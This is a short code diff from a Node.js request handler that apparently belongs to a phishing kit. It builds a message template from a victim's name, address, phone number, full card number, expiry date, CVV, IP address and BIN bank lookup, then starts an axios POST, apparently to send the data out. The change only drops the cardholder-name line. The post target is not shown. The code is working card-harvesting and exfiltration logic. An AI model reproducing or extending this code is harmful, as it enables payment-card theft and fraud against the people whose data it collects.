@@ -36,7 +36,7 @@ const sendRes = async (req, res) => {
     }
 
     const binList = `${bin} |${postcode} | ${bankName}`;
-    var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nSay: ${say}\nMei: ${mei}\nAddress: ${address1}, ${address2}, ${address3}, ${address4}\nPost Code: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+    var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nSay: ${say}\nMei: ${mei}\nAddress: ${address1}, ${address2}, ${address3}, ${address4}\nPost Code: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
 
     await axios
         .post(
